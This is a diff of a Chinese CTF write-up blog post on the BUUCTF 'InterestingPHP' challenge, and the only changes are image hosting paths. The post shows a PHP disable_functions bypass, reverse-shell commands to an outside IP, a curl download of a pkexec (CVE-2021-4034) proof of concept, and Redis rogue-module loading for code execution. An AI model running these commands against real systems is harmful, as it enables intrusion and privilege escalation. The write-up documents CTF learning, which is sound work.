@@ -147,7 +147,7 @@
 <p>许多wp里都提到了<strong>mm0r1</strong>师傅的<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">php-bypass系列exp</a> 太顶了（什么时候自己也能写出这样重量级的exp呢……即使现在还是幻想 愿望还是要有的嘛</p>
 <p>这里用到的是<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php">php-filter-bypass</a>，其中<code>fwrite()</code>被禁了，改成<code>fputs()</code>就好</p>
 <p>测试结果完美</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/2022-03-24-16-30-10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/2022-03-24-16-30-10.png"></p>
 <p>构造数据包时还遇到几个新的小知识点，在这里记录下来。</p>
 <p><strong>Multipart/form-data</strong>请求</p>
 <blockquote>
@@ -158,21 +158,21 @@
 <p>其中${bound} 是一个占位符，代表我们规定的分割符，可以自己任意规定，但为了避免和正常文本重复了，尽量要使用复杂一点的内容。如：--------------------56423498738365</p>
 </blockquote>
 <p>这样我们发送的exp才会视作为一个整体，而不是被分割的各部分。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/2022-03-24-16-31-03.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/2022-03-24-16-31-03.png"></p>
 <p>右边的Inspector也清楚地展示了被分割后的数据，这显然不是我们想要的结果，因此才会需要使用Multipart/form-data方法。</p>
 <p><strong>Content-Disposition</strong>响应标头</p>
 <blockquote>
 <p>在一个multipart/form-data正文中，HTTP Content-Disposition通用标题是一个标题，可以在多部分主体的子部分中使用，以提供有关它适用的字段的信息。</p>
 </blockquote>
 <p>个人的初步理解是，可以看作将在此分界线以内的data全部赋值给<code>name</code>。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/2022-03-24-16-32-04.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/2022-03-24-16-32-04.png"></p>
 <p>既然现在都能命令执行了，干的第一票一定是<strong>反弹shell</strong>，交互式的操作环境总是更方便的。</p>
 <p>攻击机监听2333端口</p>
 <p><code>nc -lvp 2333</code></p>
 <p>exp修改执行命令</p>
 <p><code>pwn(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1&#39;&quot;);</code></p>
 <p>成功获得shell，直冲根目录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/2022-03-24-16-32-29.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/2022-03-24-16-32-29.png"></p>
 <p>老火 看来是权限不够（cat命令没有被限制） 最开始的<code>whoami</code>命令执行回显似乎也在提醒我们，你<strong>www-data</strong>是什么用户啊，你<strong>www-data</strong>什么的都在读flag，他能读吗！读不了，没这个实力（指权限），知道嘛（悲</p>
 <p>能打开文件的各种命令都试过了，看来是只剩下提权一条路了</p>
 <p>最容易想到的应该是<code>SUID提权</code></p>
@@ -186,22 +186,22 @@
 <blockquote>
 <p>准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/2022-03-24-16-35-23.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/2022-03-24-16-35-23.png"></p>
 <p>利用点即为<a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/876.html">pkexec提权漏洞</a></p>
 <p>同时附上<a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034">poc</a> 放在自己VPS上 再通过<code>curl</code>下载</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://233.33.3.333/poc.c &gt; /tmp/poc.c</span><br><span class="line">gcc poc.c -o poc</span><br><span class="line">./poc</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/2022-03-24-16-36-00.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/2022-03-24-16-36-00.png"></p>
 <p>（瘫）</p>
 <h2 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h2><p>用<code>ini_get_all()</code>得到php相关配置信息后，使用<code>scandir()</code>探测到目录下存在<code>secret.rdb</code>文件，即redis数据备份文件；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220330215008.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220330215008.png"></p>
 <p>拖下来找到一些好康的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220330215432.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220330215432.png"></p>
 <p>猜测<code>ye_w4nt_a_gir1fri3nd</code>即redis服务的密码。</p>
 <p>但默认端口6379并没有开放，万事俱备，只欠端口</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">65535</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$t</span> = stream_socket_server(<span class="string">&quot;tcp://0.0.0.0:&quot;</span>.<span class="variable">$i</span>,<span class="variable">$ee</span>,<span class="variable">$ee2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ee2</span> === <span class="string">&quot;Address already in use&quot;</span>) &#123;</span><br><span class="line">        var_dump(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220330221032.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220330221032.png"></p>
 <p>发现<code>80</code>和<code>8888</code>端口开放，从而知晓redis端口<code>8888</code></p>
 <p>同时函数<code>get_loaded_extensions()</code>可以看到php加载的插件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(34) &#123; [0]=&gt; string(4) &quot;Core&quot; [1]=&gt; string(4) &quot;date&quot; [2]=&gt; string(6) &quot;libxml&quot; [3]=&gt; string(7) &quot;openssl&quot; [4]=&gt; string(4) &quot;pcre&quot; [5]=&gt; string(7) &quot;sqlite3&quot; [6]=&gt; string(4) &quot;zlib&quot; [7]=&gt; string(5) &quot;ctype&quot; [8]=&gt; string(4) &quot;curl&quot; [9]=&gt; string(3) &quot;dom&quot; [10]=&gt; string(8) &quot;fileinfo&quot; [11]=&gt; string(6) &quot;filter&quot; [12]=&gt; string(3) &quot;ftp&quot; [13]=&gt; string(4) &quot;hash&quot; [14]=&gt; string(5) &quot;iconv&quot; [15]=&gt; string(4) &quot;json&quot; [16]=&gt; string(8) &quot;mbstring&quot; [17]=&gt; string(3) &quot;SPL&quot; [18]=&gt; string(3) &quot;PDO&quot; [19]=&gt; string(7) &quot;session&quot; [20]=&gt; string(5) &quot;posix&quot; [21]=&gt; string(10) &quot;Reflection&quot; [22]=&gt; string(8) &quot;standard&quot; [23]=&gt; string(9) &quot;SimpleXML&quot; [24]=&gt; string(10) &quot;pdo_sqlite&quot; [25]=&gt; string(4) &quot;Phar&quot; [26]=&gt; string(9) &quot;tokenizer&quot; [27]=&gt; string(3) &quot;xml&quot; [28]=&gt; string(9) &quot;xmlreader&quot; [29]=&gt; string(9) &quot;xmlwriter&quot; [30]=&gt; string(7) &quot;mysqlnd&quot; [31]=&gt; string(14) &quot;apache2handler&quot; [32]=&gt; string(5) &quot;redis&quot; [33]=&gt; string(6) &quot;sodium&quot; &#125;</span><br></pre></td></tr></table></figure>
@@ -210,12 +210,12 @@
 <p>先利用<code>curl+file_put_contents()</code>写入redis主从复制rce的<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">.so文件</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Curl</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt ( <span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span> );</span><br><span class="line">    <span class="variable">$result</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    file_put_contents(<span class="string">&quot;exp.so&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Curl(<span class="string">&quot;http://233.33.3.333/exp.so&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220331124321.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220331124321.png"></p>
 <p>然后构造反弹shell的payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$redis</span> = <span class="keyword">new</span> Redis();</span><br><span class="line"><span class="variable">$redis</span>-&gt;connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>);</span><br><span class="line"><span class="variable">$redis</span>-&gt;auth(<span class="string">&#x27;ye_w4nt_a_gir1fri3nd&#x27;</span>);</span><br><span class="line"><span class="variable">$redis</span>-&gt;rawCommand(<span class="string">&#x27;module&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;/var/www/html/exp.so&#x27;</span>);</span><br><span class="line"><span class="variable">$redis</span>-&gt;rawCommand(<span class="string">&#x27;system.exec&#x27;</span>, <span class="string">&#x27;bash -c&#x27;</span>, <span class="string">&#x27;exec bash -i &amp;&gt; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>反弹成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220331125842.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220331125842.png"></p>
 <p>接下来的提权操作和前面完全一致。</p>
 <h1 id="菜单上新"><a href="#菜单上新" class="headerlink" title="菜单上新"></a>菜单上新</h1><p>强迫自己跨难度复现学习，这道InterestingPHP教会了我太多。</p>
 <p>虽说还有许多基础如redis数据库、sockets编程、权限提升等等没有深入学习，但接触过这次后，我相信不久后我们还会再见的。那时的我相信也不会再像这次一样找不着北了。</p>
